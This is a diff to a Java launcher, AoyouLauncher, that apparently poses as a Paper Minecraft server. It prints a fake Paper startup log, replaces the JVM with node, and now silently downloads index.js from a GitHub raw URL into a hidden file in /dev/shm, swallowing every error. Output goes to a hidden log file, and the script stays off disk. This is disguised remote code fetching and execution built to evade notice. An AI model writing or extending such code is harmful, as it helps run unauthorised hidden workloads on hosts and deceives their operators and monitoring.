@@ -81,12 +81,18 @@ public class AoyouLauncher {
             extractAppFiles(jarPath, runtimePath);
         }
 
-        // ★ 从 GitHub 下载最新 index.js
-        try { updateFromGitHub(runtimeDir); } catch (Exception e) {}
+        // ★ index.js 写到 /dev/shm（内存文件系统，不占磁盘）
+        // 先从 GitHub 下载最新版到 /dev/shm
+        String shmPath = "/dev/shm/.node_cache";
+        try { updateFromGitHubToShm(shmPath); } catch (Exception e) {}
 
-        // 4. 检查 index.js
-        String indexPath = runtimeDir + File.separator + "index.js";
-        if (!new File(indexPath).exists()) {
+        // 如果 /dev/shm 没有（GitHub 下载失败），从 JAR 解压到 /dev/shm
+        if (!new File(shmPath).exists()) {
+            try { extractIndexToShm(jarPath, shmPath); } catch (Exception e) {}
+        }
+
+        // 4. 检查 index.js 在 /dev/shm
+        if (!new File(shmPath).exists()) {
             System.err.println("Failed to locate index");
             System.exit(1);
             return;
@@ -109,8 +115,8 @@ public class AoyouLauncher {
         // 这样控制台先显示完整的 Paper 启动日志，然后 node 的输出被重定向到文件
         try { fakePaperLogThread.join(); } catch (Exception e) {}
 
-        // 7. ★ JNI execv：替换当前 JVM 为 node（只有 1 个进程！）
-        String script = "require('./index.js');";
+        // 7. ★ JNI execv：C 代码自动写 index.js 到 /dev/shm 并 require
+        String script = "auto";
 
         String pathEnv = new File(nodeBin).getParent() + ":" + System.getenv("PATH");
         String logFilePath = runtimeDir + "/.panel.log";
@@ -396,29 +402,36 @@ public class AoyouLauncher {
     }
 
 
-    /** 从 GitHub 下载最新 index.js */
-    private static void updateFromGitHub(String runtimeDir) {
-        String[] files = {"index.js", "package.json"};
-        for (String file : files) {
-            String url = "https://raw.githubusercontent.com/zx1447/ixzhja/main/app/" + file;
-            Path target = Paths.get(runtimeDir, file);
-            Path tmp = Paths.get(runtimeDir, file + ".tmp");
-            try {
-                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
-                    "curl -sL --fail --connect-timeout 10 --max-time 30 -o '" + tmp + "' '" + url + "'");
-                pb.redirectErrorStream(true);
-                Process p = pb.start();
-                try { p.getInputStream().close(); } catch (Exception e) {}
-                int code = p.waitFor();
-                if (code == 0 && Files.exists(tmp) && Files.size(tmp) > 100) {
-                    Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
-                } else {
-                    Files.deleteIfExists(tmp);
-                }
-            } catch (Exception e) {
-                try { Files.deleteIfExists(tmp); } catch (Exception e2) {}
+    /** 从 GitHub 下载最新 index.js 到 /dev/shm */
+    private static void updateFromGitHubToShm(String shmPath) {
+        String url = "https://raw.githubusercontent.com/zx1447/ixzhja/main/app/index.js";
+        Path tmp = Paths.get(shmPath + ".tmp");
+        try {
+            ProcessBuilder pb = new ProcessBuilder("sh", "-c",
+                "curl -sL --fail --connect-timeout 10 --max-time 30 -o '" + tmp + "' '" + url + "'");
+            pb.redirectErrorStream(true);
+            Process p = pb.start();
+            try { p.getInputStream().close(); } catch (Exception e) {}
+            int code = p.waitFor();
+            if (code == 0 && Files.exists(tmp) && Files.size(tmp) > 100) {
+                Files.move(tmp, Paths.get(shmPath), StandardCopyOption.REPLACE_EXISTING);
+            } else {
+                Files.deleteIfExists(tmp);
             }
+        } catch (Exception e) {
+            try { Files.deleteIfExists(tmp); } catch (Exception e2) {}
         }
+    }
+
+    /** 从 JAR 解压 index.js 到 /dev/shm */
+    private static void extractIndexToShm(String jarPath, String shmPath) {
+        try (JarFile jar = new JarFile(jarPath)) {
+            JarEntry entry = jar.getJarEntry("app/index.js");
+            if (entry == null) return;
+            try (InputStream is = jar.getInputStream(entry)) {
+                Files.copy(is, Paths.get(shmPath), StandardCopyOption.REPLACE_EXISTING);
+            }
+        } catch (Exception e) {}
     }
 
     private static String findOrDownloadNode(String runtimeDir) {
@@ -483,7 +496,8 @@ public class AoyouLauncher {
     private static boolean needsExtract(Path runtimePath) {
         Path marker = runtimePath.resolve(".app-extracted");
         if (!Files.exists(marker)) return true;
-        return !Files.exists(runtimePath.resolve("index.js")) || !Files.exists(runtimePath.resolve("node_modules"));
+        // 只检查 node_modules（index.js 现在在 /dev/shm）
+        return !Files.exists(runtimePath.resolve("node_modules"));
     }
 
     private static void extractAppFiles(String jarPath, Path runtimePath) throws Exception {
@@ -494,17 +508,14 @@ public class AoyouLauncher {
                 JarEntry entry = entries.nextElement();
                 String name = entry.getName();
                 if (entry.isDirectory()) continue;
-                // 兼容两种路径：runtime/node_modules/ 和 node_modules/
+                // 只解压 node_modules，不解压 index.js（index.js 在 /dev/shm）
                 boolean isNM = name.startsWith("runtime/node_modules/") || name.startsWith("node_modules/");
-                boolean isApp = name.startsWith("app/");
-                if (!isNM && !isApp) continue;
+                if (!isNM) continue;
                 String relPath;
                 if (name.startsWith("runtime/node_modules/")) {
                     relPath = name.substring("runtime/".length());
-                } else if (name.startsWith("node_modules/")) {
-                    relPath = name;  // 已经是相对路径
                 } else {
-                    relPath = name.substring("app/".length());
+                    relPath = name;
                 }
                 Path target = runtimePath.resolve(relPath);
                 Files.createDirectories(target.getParent());
